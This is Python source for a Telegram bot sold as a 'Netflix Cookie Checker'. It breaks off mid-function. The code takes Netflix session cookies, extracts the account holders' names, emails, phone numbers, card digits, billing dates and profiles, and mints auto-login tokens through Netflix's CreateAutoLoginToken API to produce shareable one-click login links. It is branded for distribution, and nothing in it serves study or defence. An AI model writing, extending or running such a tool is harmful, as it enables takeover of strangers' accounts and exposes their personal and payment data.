#!/usr/bin/env python3
"""
Netflix Cookie Checker Bot – Telegram version
Uses the same checking logic as main.py
"""

import asyncio
import copy
import html
import io
import json
import logging
import os
import random
import re
import string
import sys
import threading
import time
import traceback
import unicodedata
import zipfile
from collections import defaultdict
from datetime import datetime, timedelta, timezone
from typing import Dict, List, Optional, Tuple, Any, Set

import requests
import concurrent.futures

# -------------------------------
#   Core functions from main.py
# -------------------------------

DEFAULT_CONFIG = {
    "txt_fields": {
        "name": False, "email": False, "max_streams": True, "plan": True,
        "country": True, "member_since": False, "next_billing": True,
        "extra_members": True, "payment_method": True, "card": False,
        "phone": False, "quality": True, "hold_status": False,
        "email_verified": False, "membership_status": False,
        "profiles": True, "user_guid": False,
    },
    "nftoken": True,
    "notifications": {"webhook": {"enabled": False}, "telegram": {"enabled": False}},
    "display": {"mode": "simple"},
    "retries": {"error_proxy_attempts": 3, "nftoken_attempts": 1},
}

REQUIRED_NETFLIX_COOKIES = ("NetflixId", "SecureNetflixId", "nfvdid")
OPTIONAL_NETFLIX_COOKIES = ("OptanonConsent",)
ALL_NETFLIX_COOKIE_NAMES = set(REQUIRED_NETFLIX_COOKIES + OPTIONAL_NETFLIX_COOKIES)

NFTOKEN_API_URL = "https://android13.prod.ftl.netflix.com/graphql"
NFTOKEN_HEADERS = {
    "User-Agent": "com.netflix.mediaclient/63884 (Linux; U; Android 13; ro; M2007J3SG; Build/TQ1A.230205.001.A2; Cronet/143.0.7445.0)",
    "Accept": "multipart/mixed;deferSpec=20220824, application/graphql-response+json, application/json",
    "Content-Type": "application/json",
    "Origin": "https://www.netflix.com",
    "Referer": "https://www.netflix.com/",
}
NFTOKEN_PAYLOAD = {
    "operationName": "CreateAutoLoginToken",
    "variables": {"scope": "WEBVIEW_MOBILE_STREAMING"},
    "extensions": {"persistedQuery": {"version": 102, "id": "76e97129-f4b5-41a0-a73c-12e674896849"}},
}

MONTH_ALIASES = {
    "january": 1, "enero": 1, "janvier": 1, "januar": 1, "janeiro": 1, "ocak": 1,
    "styczen": 1, "stycznia": 1, "มกราคม": 1, "มกรา": 1, "ม.ค": 1, "يناير": 1,
    "januari": 1, "gennaio": 1, "ianuarie": 1, "jan": 1, "يناير": 1, "בינואר": 1,
    "ιανουαριος": 1,
    "february": 2, "febrero": 2, "fevrier": 2, "fevereiro": 2, "subat": 2,
    "luty": 2, "lutego": 2, "กุมภาพันธ์": 2, "กุมภา": 2, "ก.พ": 2, "فبراير": 2,
    "februari": 2, "febbraio": 2, "februarie": 2, "feb": 2, "בפברואר": 2,
    "φεβρουαριος": 2,
    "march": 3, "marzo": 3, "mars": 3, "marco": 3, "marzec": 3, "marca": 3,
    "มีนาคม": 3, "มีนา": 3, "มี.ค": 3, "مارس": 3, "maret": 3, "mac": 3,
    "mart": 3, "martie": 3, "marz": 3, "brezna": 3, "ozujka": 3, "maart": 3,
    "اذار": 3, "بمارس": 3, "במרץ": 3, "marcius": 3, "martie": 3, "μαρτιος": 3,
    "abril": 4, "avril": 4, "kwiecien": 4, "kwietnia": 4, "เมษายน": 4, "เมษา": 4,
    "เม.ย": 4, "أبريل": 4, "ابريل": 4, "aprile": 4, "april": 4, "aprilie": 4,
    "באפריל": 4, "nisan": 4, "apr": 4, "απριλιος": 4,
    "may": 5, "mayo": 5, "mai": 5, "maj": 5, "maja": 5, "พฤษภาคม": 5, "พฤษภา": 5,
    "พ.ค": 5, "مايو": 5, "mei": 5, "maggio": 5, "mayis": 5, "במאי": 5, "μαιος": 5,
    "june": 6, "junio": 6, "juin": 6, "haziran": 6, "czerwiec": 6, "czerwca": 6,
    "มิถุนายน": 6, "มิถุนา": 6, "มิ.ย": 6, "يونيو": 6, "juni": 6, "giugno": 6,
    "ביוני": 6, "ιουνιος": 6,
    "july": 7, "julio": 7, "juillet": 7, "temmuz": 7, "lipiec": 7, "lipca": 7,
    "กรกฎาคม": 7, "กรกฎา": 7, "ก.ค": 7, "يوليو": 7, "juli": 7, "luglio": 7,
    "ביולי": 7, "ιουλιος": 7,
    "august": 8, "agosto": 8, "aout": 8, "août": 8, "agost": 8, "sierpien": 8,
    "sierpnia": 8, "สิงหาคม": 8, "สิงหา": 8, "ส.ค": 8, "أغسطس": 8, "اغسطس": 8,
    "agustus": 8, "agosto": 8, "agustos": 8, "באוגוסט": 8, "αυγουστος": 8,
    "septiembre": 9, "setembro": 9, "eylul": 9, "wrzesien": 9, "wrzesnia": 9,
    "กันยายน": 9, "กันยา": 9, "ก.ย": 9, "سبتمبر": 9, "september": 9,
    "settembre": 9, "בספטמבר": 9, "σεπτεμβριος": 9,
    "october": 10, "octubre": 10, "outubro": 10, "ekim": 10, "pazdziernik": 10,
    "pazdziernika": 10, "ตุลาคม": 10, "ตุลา": 10, "ต.ค": 10, "أكتوبر": 10,
    "اكتوبر": 10, "oktober": 10, "ottobre": 10, "באוקטובר": 10, "οκτωβριος": 10,
    "noviembre": 11, "novembro": 11, "kasim": 11, "listopad": 11, "listopada": 11,
    "พฤศจิกายน": 11, "พฤศจิกา": 11, "พ.ย": 11, "نوفمبر": 11, "november": 11,
    "novembre": 11, "בנובמבר": 11, "νοεμβριος": 11,
    "diciembre": 12, "dezembro": 12, "aralik": 12, "grudzien": 12, "grudnia": 12,
    "ธันวาคม": 12, "ธันวา": 12, "ธ.ค": 12, "ديسمبر": 12, "desember": 12,
    "dicembre": 12, "december": 12, "בדצמבר": 12, "δεκεμβριος": 12,
}

# ----------------------------------------------------------------------
# Helper functions copied from main.py
# ----------------------------------------------------------------------

def decode_netflix_value(value):
    if value is None:
        return None
    cleaned = html.unescape(str(value))
    replacements = {
        "\\x20": " ", "\\u00A0": " ", "\\u00a0": " ", "&nbsp;": " ", "u00A0": " ",
    }
    for src, tgt in replacements.items():
        cleaned = cleaned.replace(src, tgt)
    cleaned = cleaned.replace("\\/", "/").replace('\\"', '"').replace("\\n", " ").replace("\\t", " ")
    for _ in range(3):
        prev = cleaned
        cleaned = re.sub(r"\\u([0-9a-fA-F]{4})", lambda m: chr(int(m.group(1), 16)), cleaned)
        cleaned = re.sub(r"\\x([0-9a-fA-F]{2})", lambda m: chr(int(m.group(1), 16)), cleaned)
        cleaned = cleaned.replace("\\\\", "\\")
        if cleaned == prev:
            break
    cleaned = re.sub(r"\s+", " ", cleaned).strip()
    return cleaned or None

def escape_md(text):
    escape_chars = r"_*[]()~`>#+-=|{}.!\\"
    return ''.join('\\' + c if c in escape_chars else c for c in text)

def extract_first_match(text, patterns, flags=0):
    for pat in patterns:
        m = re.search(pat, text, flags)
        if m:
            return decode_netflix_value(m.group(1))
    return None

def extract_bool_value(text, patterns):
    val = extract_first_match(text, patterns, re.IGNORECASE)
    if val is None:
        return None
    l = val.lower()
    if l == "true":
        return "Yes"
    if l == "false":
        return "No"
    return val

def extract_profile_names(text):
    names = []
    for pat in [
        r'"profileName"\s*:\s*"([^"]+)"',
        r'"profileName"\s*:\s*\{\s*"fieldType"\s*:\s*"String"\s*,\s*"value"\s*:\s*"([^"]+)"',
    ]:
        for found in re.findall(pat, text, re.DOTALL):
            dec = decode_netflix_value(found)
            if dec and dec not in names:
                names.append(dec)
    for m in re.finditer(r'"__typename"\s*:\s*"Profile"', text):
        snippet = text[m.start():m.start()+1200]
        name_match = re.search(r'"name"\s*:\s*"([^"]+)"', snippet)
        if name_match:
            dec = decode_netflix_value(name_match.group(1))
            if dec and dec not in names:
                names.append(dec)
    if not names:
        return None
    return ", ".join(names)

def merge_info(primary, fallback):
    merged = dict(fallback or {})
    for k, v in (primary or {}).items():
        if v not in (None, "", [], {}):
            merged[k] = v
    return merged

def extract_info_from_graphql_payload(text):
    try:
        data = json.loads(text).get("data", {})
    except:
        return {}
    if not isinstance(data, dict):
        return {}
    growth_account = data.get("growthAccount") or {}
    current_profile = data.get("currentProfile") or {}
    current_plan = ((growth_account.get("currentPlan") or {}).get("plan") or {})
    next_plan = ((growth_account.get("nextPlan") or {}).get("plan") or {})
    next_billing = growth_account.get("nextBillingDate") or {}
    hold_meta = growth_account.get("growthHoldMetadata") or {}
    local_phone = growth_account.get("growthLocalizablePhoneNumber") or {}
    raw_phone = local_phone.get("rawPhoneNumber") or {}
    payment_methods = growth_account.get("growthPaymentMethods") or []
    payment_method = payment_methods[0] if payment_methods and isinstance(payment_methods[0], dict) else {}
    payment_logo = (payment_method.get("paymentOptionLogo") or {}).get("paymentOptionLogo")
    payment_typename = str(payment_method.get("__typename") or "")
    payment_display_text = decode_netflix_value(payment_method.get("displayText"))
    profiles = growth_account.get("profiles") or []
    phone_digits = None
    phone_verified_graphql = None
    phone_country_code = None
    if isinstance(raw_phone, dict):
        digits_obj = raw_phone.get("phoneNumberDigits") or {}
        phone_digits = digits_obj.get("value") if isinstance(digits_obj, dict) else raw_phone.get("phoneNumberDigits")
        phone_verified_graphql = raw_phone.get("isVerified")
        phone_country_code = raw_phone.get("countryCode")
    else:
        phone_digits = raw_phone
    def _growth_email(profile_obj):
        if not isinstance(profile_obj, dict):
            return None, None
        ge = profile_obj.get("growthEmail") or {}
        email_obj = ge.get("email") or {}
        email_val = email_obj.get("value") if isinstance(email_obj, dict) else None
        return email_val, ge.get("isVerified")
    email_value, email_verified = _growth_email(current_profile)
    if not email_value:
        for p in profiles:
            email_value, email_verified = _growth_email(p)
            if email_value:
                break
    profile_names = []
    for p in profiles:
        if isinstance(p, dict):
            name = decode_netflix_value(p.get("name"))
            if name and name not in profile_names:
                profile_names.append(name)
    feature_types = []
    for plan_obj in (current_plan, next_plan):
        for feat in (plan_obj.get("availableFeatures") or []):
            if isinstance(feat, dict) and feat.get("type"):
                feature_types.append(str(feat["type"]).upper())
    def _extract_price(plan_obj):
        if not isinstance(plan_obj, dict):
            return None
        candidates = [
            plan_obj.get("priceDisplay"), plan_obj.get("displayPrice"),
            plan_obj.get("formattedPrice"), plan_obj.get("formattedPlanPrice"),
            plan_obj.get("planPriceDisplay"),
        ]
        for c in candidates:
            d = decode_netflix_value(c)
            if d:
                return d
        price_obj = plan_obj.get("price")
        if isinstance(price_obj, dict):
            for key in ("displayValue", "formatted", "formattedPrice", "displayPrice", "value", "amountDisplay"):
                d = decode_netflix_value(price_obj.get(key))
                if d:
                    return d
        return None
    info = {
        "accountOwnerName": decode_netflix_value(current_profile.get("name")),
        "email": decode_netflix_value(email_value),
        "countryOfSignup": decode_netflix_value(((growth_account.get("countryOfSignUp") or {}).get("code"))),
        "memberSince": decode_netflix_value(growth_account.get("memberSince")),
        "nextBillingDate": decode_netflix_value(next_billing.get("localDate") or next_billing.get("date")),
        "userGuid": decode_netflix_value(growth_account.get("ownerGuid") or current_profile.get("guid")),
        "showExtraMemberSection": "Yes" if "EXTRA_MEMBER" in feature_types else "No" if feature_types else None,
        "membershipStatus": decode_netflix_value(growth_account.get("membershipStatus")),
        "localizedPlanName": decode_netflix_value(current_plan.get("name") or next_plan.get("name")),
        "planPrice": _extract_price(current_plan) or _extract_price(next_plan),
        "paymentMethodType": decode_netflix_value(payment_logo or growth_account.get("payer")),
        "maskedCard": None,
        "phoneNumber": phone_digits,
        "videoQuality": decode_netflix_value(current_plan.get("videoQuality")),
        "holdStatus": "Yes" if hold_meta.get("isUserOnHold") is True else "No" if hold_meta.get("isUserOnHold") is False else None,
        "emailVerified": "Yes" if email_verified is True else "No" if email_verified is False else None,
        "phoneVerified": "Yes" if phone_verified_graphql is True else "No" if phone_verified_graphql is False else None,
        "profiles": ", ".join(profile_names) if profile_names else None,
    }
    if "Card" in payment_typename:
        info["paymentMethodType"] = "CC"
        if payment_display_text:
            if re.fullmatch(r"\d{4}", payment_display_text):
                info["maskedCard"] = payment_display_text
            else:
                info["maskedCard"] = payment_display_text
    elif payment_display_text and payment_logo is None and not re.fullmatch(r"\d{4}", payment_display_text):
        info["paymentMethodType"] = info["paymentMethodType"] or payment_display_text
    if not info["paymentMethodType"] and payment_methods and "Card" in payment_typename:
        info["paymentMethodType"] = "CC"
    return {k: v for k, v in info.items() if v not in (None, "", [], {})}

def extract_info(text):
    graphql_info = extract_info_from_graphql_payload(text)
    extracted = {
        "accountOwnerName": extract_first_match(text, [
            r'userInfo"\s*:\s*\{\s*"name"\s*:\s*"([^"]+)"',
            r'"accountOwnerName"\s*:\s*"([^"]+)"',
            r'"name"\s*:\s*\{\s*"fieldType"\s*:\s*"String"\s*,\s*"value"\s*:\s*"([^"]+)"',
            r'"firstName"\s*:\s*"([^"]+)"',
        ]),
        "email": extract_first_match(text, [
            r'"emailAddress"\s*:\s*"([^"]+)"',
            r'"email"\s*:\s*"([^"]+)"',
            r'"loginId"\s*:\s*"([^"]+)"',
        ]),
        "countryOfSignup": extract_first_match(text, [
            r'"currentCountry"\s*:\s*"([^"]+)"',
            r'"countryOfSignup":\s*"([^"]+)"',
        ]),
        "memberSince": extract_first_match(text, [r'"memberSince":\s*"([^"]+)"']),
        "nextBillingDate": extract_first_match(text, [
            r'"GrowthNextBillingDate"\s*,\s*"date"\s*:\s*"([^"T]+)T',
            r'"nextBillingDate"\s*:\s*"([^"]+)"',
            r'"nextBilling"\s*:\s*\{\s*"fieldType"\s*:\s*"String"\s*,\s*"value"\s*:\s*"([^"]+)"',
        ]),
        "userGuid": extract_first_match(text, [r'"userGuid":\s*"([^"]+)"']),
        "showExtraMemberSection": extract_bool_value(text, [
            r'"showExtraMemberSection":\s*\{\s*"fieldType":\s*"Boolean",\s*"value":\s*(true|false)',
            r'"showExtraMemberSection"\s*:\s*(true|false)',
        ]),
        "membershipStatus": extract_first_match(text, [r'"membershipStatus":\s*"([^"]+)"']),
        "maxStreams": extract_first_match(text, [
            r'maxStreams\":\{\"fieldType\":\"Numeric\",\"value\":([^,]+),',
            r'"maxStreams"\s*:\s*"?([^",}]+)"?',
        ]),
        "localizedPlanName": extract_first_match(text, [
            r'"MemberPlan"\s*,\s*"fields"\s*:\s*\{\s*"localizedPlanName"\s*:\s*\{\s*"fieldType"\s*:\s*"String"\s*,\s*"value"\s*:\s*"([^"]+)"',
            r'localizedPlanName\":\{\"fieldType\":\"String\",\"value\":\"([^"]+)"',
            r'"currentPlan"\s*:\s*\{[\s\S]*?"plan"\s*:\s*\{[\s\S]*?"name"\s*:\s*"([^"]+)"',
            r'"nextPlan"\s*:\s*\{[\s\S]*?"plan"\s*:\s*\{[\s\S]*?"name"\s*:\s*"([^"]+)"',
            r'"localizedPlanName"\s*:\s*"([^"]+)"',
            r'"planName"\s*:\s*"([^"]+)"',
        ]),
        "planPrice": extract_first_match(text, [
            r'"formattedPlanPrice"\s*:\s*"([^"]+)"',
            r'"formattedPrice"\s*:\s*"([^"]+)"',
            r'"planPriceDisplay"\s*:\s*"([^"]+)"',
            r'"displayPrice"\s*:\s*"([^"]+)"',
            r'"price"\s*:\s*\{\s*"fieldType"\s*:\s*"String"\s*,\s*"value"\s*:\s*"([^"]+)"',
            r'"planPrice"\s*:\s*"([^"]+)"',
        ]),
        "paymentMethodExists": extract_bool_value(text, [
            r'"paymentMethodExists":\s*\{\s*"fieldType":\s*"Boolean",\s*"value":\s*(true|false)',
            r'"paymentMethodExists"\s*:\s*(true|false)',
        ]),
        "paymentMethodType": extract_first_match(text, [
            r'"paymentMethod"\s*:\s*\{\s*"fieldType"\s*:\s*"String"\s*,\s*"value"\s*:\s*"([^"]+)"',
            r'"paymentMethod"\s*:\s*"([^"]+)"',
            r'"paymentType"\s*:\s*"([^"]+)"',
            r'"paymentMethodType"\s*:\s*"([^"]+)"',
        ]),
        "maskedCard": extract_first_match(text, [
            r'"__typename"\s*:\s*"GrowthCardPaymentMethod"[\s\S]*?"displayText"\s*:\s*"([^"]+)"',
            r'"paymentCardDisplayString"\s*:\s*"([^"]+)"',
            r'"paymentMethodLast4"\s*:\s*"([^"]+)"',
            r'"lastFour"\s*:\s*"([^"]+)"',
            r'"creditCardLast4"\s*:\s*"([^"]+)"',
            r'"maskedCard"\s*:\s*"([^"]+)"',
        ]),
        "phoneNumber": extract_first_match(text, [
            r'"phoneNumberDigits"\s*:\s*\{[\s\S]*?"value"\s*:\s*"([^"]+)"',
            r'"phoneNumber"\s*:\s*"([^"]+)"',
            r'"mobilePhone"\s*:\s*"([^"]+)"',
        ]),
        "phoneVerified": extract_bool_value(text, [
            r'"phoneVerified"\s*:\s*(true|false)',
            r'"isPhoneVerified"\s*:\s*(true|false)',
        ]),
        "videoQuality": extract_first_match(text, [
            r'videoQuality"\s*:\s*\{\s*"fieldType"\s*:\s*"String"\s*,\s*"value"\s*:\s*"([^"]+)"',
            r'"videoQuality"\s*:\s*"([^"]+)"',
            r'"quality"\s*:\s*"([^"]+)"',
        ]),
        "holdStatus": extract_bool_value(text, [
            r'"holdStatus"\s*:\s*(true|false)',
            r'"isOnHold"\s*:\s*(true|false)',
            r'"pastDue"\s*:\s*(true|false)',
        ]),
        "emailVerified": extract_bool_value(text, [
            r'"emailVerified"\s*:\s*(true|false)',
            r'"isEmailVerified"\s*:\s*(true|false)',
            r'"emailAddressVerified"\s*:\s*(true|false)',
        ]),
        "profiles": extract_profile_names(text),
    }
    merged = merge_info(graphql_info, extracted)
    # Additional cleanup
    if merged.get("localizedPlanName"):
        merged["localizedPlanName"] = merged["localizedPlanName"].replace("miembro u00A0extra", "(Extra Member)")
    if not merged.get("paymentMethodType"):
        merged["paymentMethodType"] = merged.get("paymentMethodExists")
    if merged.get("maskedCard") and re.fullmatch(r"\d{4}", merged["maskedCard"]):
        if merged.get("paymentMethodType") in {None, "", "Yes"}:
            merged["paymentMethodType"] = "CC"
    if merged.get("holdStatus") is None and merged.get("membershipStatus") == "CURRENT_MEMBER":
        merged["holdStatus"] = "No"
    if merged.get("emailVerified") is None and merged.get("email"):
        merged["emailVerified"] = "Yes"
    # Normalize phone
    phone = merged.get("phoneNumber")
    if phone:
        merged["phoneDisplay"] = normalize_phone_number(phone, merged.get("countryOfSignup"))
    # Profiles
    profiles = merged.get("profiles")
    if profiles:
        merged["profileCount"] = len([n for n in profiles.split(", ") if n])
        merged["profilesDisplay"] = profiles
    else:
        merged["profileCount"] = None
        merged["profilesDisplay"] = None
    return merged

def normalize_phone_number(value, country_code=None):
    cleaned = decode_netflix_value(value)
    if not cleaned:
        return None
    if str(cleaned).startswith("+"):
        return cleaned
    digits = re.sub(r"\D+", "", str(cleaned))
    if not digits:
        return cleaned
    norm_country = (decode_netflix_value(country_code) or "").strip().upper()
    dial_map = {"IN": "91"}
    prefix = dial_map.get(norm_country)
    if prefix and digits.startswith("0") and len(digits) >= 10:
        return f"+{prefix}{digits.lstrip('0')}"
    return cleaned

def country_code_to_flag(code):
    code = (decode_netflix_value(code) or "").strip().upper()
    if len(code) != 2 or not code.isalpha():
        return ""
    return "".join(chr(127397 + ord(c)) for c in code)

def parse_localized_date(cleaned):
    if not cleaned:
        return None
    for fmt in ("%Y-%m-%d", "%Y-%m-%dT%H:%M:%S", "%Y-%m-%dT%H:%M:%S.%f", "%Y-%m-%dT%H:%M:%S.%f%z"):
        try:
            return datetime.strptime(cleaned, fmt)
        except:
            continue
    try:
        return datetime.fromisoformat(cleaned.replace("Z", "+00:00"))
    except:
        pass
    num_parts = [int(p) for p in re.findall(r"\d+", cleaned)]
    if len(num_parts) >= 3:
        a, b, c = num_parts[0], num_parts[1], num_parts[2]
        try:
            if 1900 <= a <= 3000 and 1 <= b <= 12 and 1 <= c <= 31:
                return datetime(a, b, c)
            if 1 <= a <= 31 and 1 <= b <= 12 and 1900 <= c <= 3000:
                return datetime(c, b, a)
        except:
            pass
    low = cleaned.lower()
    simp = unicodedata.normalize("NFKD", low)
    simp = "".join(ch for ch in simp if not unicodedata.combining(ch))
    year_match = re.search(r"(19|20)\d{2}", simp)
    if not year_match:
        return None
    year = int(year_match.group(0))
    month = None
    for alias, m in MONTH_ALIASES.items():
        if alias in low or alias in simp:
            month = m
            break
    if month is None:
        return None
    day = 1
    for n in num_parts:
        if n == year:
            continue
        if 1 <= n <= 31:
            day = n
            break
    try:
        return datetime(year, month, day)
    except:
        return None

def format_display_date(value):
    cleaned = decode_netflix_value(value)
    if not cleaned:
        return "UNKNOWN"
    parsed = parse_localized_date(cleaned)
    if parsed:
        return parsed.strftime("%B %d, %Y").replace(" 0", " ")
    return cleaned

def format_member_since(value):
    cleaned = decode_netflix_value(value)
    if not cleaned:
        return "UNKNOWN"
    parsed = parse_localized_date(cleaned)
    if parsed:
        return parsed.strftime("%B %Y")
    # fallback: try to extract month/year numbers
    nums = re.findall(r"\d+", cleaned)
    if len(nums) >= 2:
        try:
            month = int(nums[0])
            year = int(nums[-1])
            if 1 <= month <= 12 and 1900 <= year <= 3000:
                return datetime(year, month, 1).strftime("%B %Y")
        except:
            pass
    low = cleaned.lower()
    simp = unicodedata.normalize("NFKD", low)
    simp = "".join(ch for ch in simp if not unicodedata.combining(ch))
    ym = re.search(r"(19|20)\d{2}", simp)
    if ym:
        year = int(ym.group(0))
        for alias, month in MONTH_ALIASES.items():
            if alias in low or alias in simp:
                try:
                    return datetime(year, month, 1).strftime("%B %Y")
                except:
                    pass
    return cleaned

def normalize_plan_key(plan_name):
    if not plan_name:
        return "unknown"
    simp = unicodedata.normalize("NFKD", plan_name)
    simp = "".join(ch for ch in simp if not unicodedata.combining(ch))
    norm = re.sub(r"[^\w]+", "_", simp.lower(), flags=re.UNICODE).strip("_")
    return norm or "unknown"

def get_canonical_output_label(plan_key):
    labels = {
        "premium": "Premium", "standard_with_ads": "Standard With Ads",
        "standard": "Standard", "basic": "Basic", "mobile": "Mobile",
        "free": "Free", "duplicate": "Duplicate", "unknown": "Unknown",
    }
    return labels.get(plan_key, "Unknown")

def format_plan_label(plan_key):
    if not plan_key:
        return "Unknown"
    return plan_key.replace("_", " ").title()

def _int_or_none(val):
    cleaned = decode_netflix_value(val)
    if cleaned is None:
        return None
    try:
        return int(str(cleaned).strip())
    except:
        match = re.search(r"\d+", str(cleaned))
        if match:
            try:
                return int(match.group(0))
            except:
                pass
        return None

def derive_plan_info(info, is_subscribed):
    raw_plan = decode_netflix_value(info.get("localizedPlanName"))
    raw_quality = decode_netflix_value(info.get("videoQuality"))
    streams = _int_or_none(info.get("maxStreams"))
    if not is_subscribed and not raw_plan:
        return "free", "Free"
    normalized = normalize_plan_key(raw_plan) if raw_plan else ""
    aliases = {
        "premium": {"premium", "cao_cap", "高級", "高级", "ozel", "المميزة", "พรีเมียม", "פרמיום", "πριμιουμ"},
        "standard_with_ads": {"standard_with_ads", "standardwithads", "estandar_con_anuncios", "padrao_com_anuncios", "광고형_스탠다드"},
        "standard": {"standard", "estandar", "standardowy", "padrao", "standart", "มาตรฐาน", "סטנדרטית", "τυπικο"},
        "basic": {"basic", "basico", "basique", "basis", "βασικο", "基本", "podstawowy", "الاساسية", "בסיסית"},
        "mobile": {"ponsel", "mobile"},
    }
    for canon, ali in aliases.items():
        if normalized in ali:
            return canon, get_canonical_output_label(canon)
    if streams is not None:
        qnorm = normalize_plan_key(raw_quality) if raw_quality else ""
        if streams >= 4 or qnorm in {"uhd", "ultra_hd", "4k"}:
            return "premium", "Premium"
        if streams >= 2 or qnorm in {"hd", "full_hd"}:
            return "standard", "Standard"
        if streams == 1:
            if normalized in {"ponsel", "mobile"}:
                return "mobile", "Mobile"
            return "basic", "Basic"
    if raw_plan:
        return normalize_plan_key(raw_plan), raw_plan
    if not is_subscribed:
        return "free", "Free"
    return "unknown", "Unknown"

def normalize_output_value(value, unknown_fallback="UNKNOWN", na_when_false=False):
    cleaned = decode_netflix_value(value)
    if cleaned is None or cleaned == "":
        return unknown_fallback
    low = str(cleaned).strip().lower()
    if low in {"false", "none", "null"}:
        return "N/A" if na_when_false else unknown_fallback
    return cleaned

def build_account_detail_lines(config, info, is_subscribed):
    txt_fields = config.get("txt_fields", {})
    free_hidden = {"member_since", "next_billing", "payment_method", "card", "phone",
                   "quality", "max_streams", "hold_status", "extra_members", "membership_status"}
    _, norm_plan_label = derive_plan_info(info, is_subscribed)
    vals = {
        "name": normalize_output_value(info.get("accountOwnerName")),
        "email": normalize_output_value(info.get("email")),
        "country": normalize_output_value(info.get("countryOfSignup")),
        "plan": normalize_output_value(norm_plan_label),
        "member_since": format_member_since(info.get("memberSince")),
        "next_billing": format_display_date(info.get("nextBillingDate")),
        "payment_method": normalize_output_value(info.get("paymentMethodType"), na_when_false=True),
        "card": normalize_output_value(info.get("maskedCard"), unknown_fallback="N/A", na_when_false=True),
        "phone": normalize_output_value(info.get("phoneDisplay")),
        "quality": normalize_output_value(info.get("videoQuality")),
        "max_streams": normalize_output_value((info.get("maxStreams") or "").rstrip("}")),
        "hold_status": normalize_output_value(info.get("holdStatus")),
        "extra_members": normalize_output_value(info.get("showExtraMemberSection")),
        "email_verified": normalize_output_value(info.get("emailVerified")),
        "membership_status": normalize_output_value(info.get("membershipStatus")),
        "profiles": normalize_output_value(info.get("profilesDisplay")),
        "user_guid": normalize_output_value(info.get("userGuid")),
    }
    labels = [
        ("name", "Name"), ("email", "Email"), ("country", "Country"), ("plan", "Plan"),
        ("member_since", "Member Since"), ("next_billing", "Next Billing"),
        ("payment_method", "Payment"), ("card", "Card"), ("phone", "Phone"),
        ("quality", "Quality"), ("max_streams", "Streams"), ("hold_status", "Hold Status"),
        ("extra_members", "Extra Member"), ("email_verified", "Email Verified"),
        ("membership_status", "Membership Status"), ("profiles", "Profiles"),
        ("user_guid", "User GUID"),
    ]
    lines = []
    for key, label in labels:
        if not is_subscribed and key in free_hidden:
            continue
        if key == "card" and vals.get("payment_method", "").strip().upper() != "CC":
            continue
        if key in {"hold_status", "extra_members"} and vals.get(key) != "Yes":
            continue
        if txt_fields.get(key, True):
            rendered = label
            if key == "profiles" and info.get("profileCount"):
                rendered = f"Profiles ({info['profileCount']})"
            lines.append(f"{rendered}: {vals[key]}")
    return lines

def get_nftoken_mode(config):
    raw = config.get("nftoken", True)
    if isinstance(raw, bool):
        return "true" if raw else "false"
    mode = str(raw).strip().lower()
    if mode in {"true", "false"}:
        return mode
    return "true"

def get_nftoken_expiry_utc():
    return (datetime.utcnow() + timedelta(hours=1)).strftime("%Y-%m-%d %H:%M:%S UTC")

def has_usable_nftoken(data):
    if not isinstance(data, dict):
        return False
    token = decode_netflix_value(data.get("token"))
    if not token:
        return False
    if str(token).strip().lower() in {"unavailable", "unknown", "none", "null", "false"}:
        return False
    return True

def build_nftoken_links(token, mode):
    if not token or mode == "false":
        return []
    return [("Login Link", f"https://netflix.com/?nftoken={token}")]


def format_cookie_file(info, cookie_content, config, is_subscribed, nftoken_data=None):
    flag = country_code_to_flag(info.get("countryOfSignup"))

    profiles_raw = info.get("profilesDisplay") or ""
    profiles = [p.strip() for p in profiles_raw.split(",") if p.strip()]

    token = (nftoken_data or {}).get("token") if nftoken_data else None
    expiry = (nftoken_data or {}).get("expires_at_utc") if nftoken_data else None

    netflix_id = ""
    for line in cookie_content.splitlines():
        parts = line.split("\t")
        if len(parts) >= 7 and parts[5] == "NetflixId":
            netflix_id = parts[6]
            break

    verified = info.get("emailVerified")
    verified_text = "✅ Yes" if str(verified).lower() == "yes" else "❌ No"

    streams_text = str(info.get("maxStreams", "?")).rstrip("}")

    lines = []

    lines.append("╭━━━━━━━━━━━━━━━━━━━━━━━━╮")
    lines.append("🎬 NETFLIX ACCOUNT")
    lines.append("╰━━━━━━━━━━━━━━━━━━━━━━━━╯")
    lines.append("")

    lines.append("👤 ACCOUNT DETAILS")
    lines.append(f"│ • Name         : {info.get('accountOwnerName','UNKNOWN')}")
    lines.append(f"│ • Email        : {info.get('email','UNKNOWN')}")
    lines.append(f"│ • Country      : {flag} {info.get('countryOfSignup','UNKNOWN')}")
    lines.append(f"│ • Member Since : {format_member_since(info.get('memberSince'))}")
    lines.append(f"│ • Status       : {info.get('membershipStatus','UNKNOWN')}")
    lines.append(f"│ • Verified     : {verified_text}")
    lines.append("")

    lines.append("💳 SUBSCRIPTION")
    lines.append(f"│ • Plan         : {info.get('localizedPlanName','UNKNOWN')}")
    lines.append(f"│ • Quality      : {info.get('videoQuality','UNKNOWN')}")
    lines.append(f"│ • Streams      : {streams_text}")
    lines.append(f"│ • Billing      : {format_display_date(info.get('nextBillingDate'))}")
    lines.append(f"│ • Payment      : {info.get('paymentMethodType','UNKNOWN')}")
    lines.append("")

    if profiles:
        lines.append(f"👥 PROFILES ({len(profiles)})")
        for i, p in enumerate(profiles):
            lines.append(f"│ {i+1}. {p}")
        lines.append("")

    # ✅ FIXED LOGIN (INDENTED PROPERLY)
    if token:
        login_url = f"https://netflix.com/?nftoken={token}"

        lines.append("🔐 LOGIN")
        lines.append(f"│ • PC     : {login_url}")
        lines.append(f"│ • Mobile : {login_url}")

        if expiry:
            try:
                from datetime import datetime, timezone
                dt = datetime.strptime(expiry, "%Y-%m-%d %H:%M:%S UTC")
                dt = dt.replace(tzinfo=timezone.utc)

                nice_exp = dt.strftime("%B %d, %Y at %I:%M %p UTC").replace(" 0", " ")

                remaining = dt - datetime.now(timezone.utc)
                if remaining.total_seconds() > 0:
                    mins = int(remaining.total_seconds() // 60)
                    nice_exp += f" ({mins} min left)"
                else:
                    nice_exp = "Expired"
            except:
                nice_exp = expiry

            lines.append(f"│ • Expires: {nice_exp}")

        lines.append("")

    lines.append("━━━━━━━━━━━━━━━━━━━━━━━━━━")
    lines.append("🍪 COOKIE")
    lines.append("")

    if netflix_id:
        lines.append(f"NetflixId={netflix_id}")
    else:
        lines.append("No NetflixId found")

    lines.append("━━━━━━━━━━━━━━━━━━━━━━━━━━")
    lines.append("👑 Powered by @Edwxrdee")

    return "\n".join(lines)

def is_netflix_cookie_entry(domain, name):
    return name in ALL_NETFLIX_COOKIE_NAMES or ("netflix." in str(domain).lower())

def convert_json_to_netscape(json_data):
    if isinstance(json_data, dict):
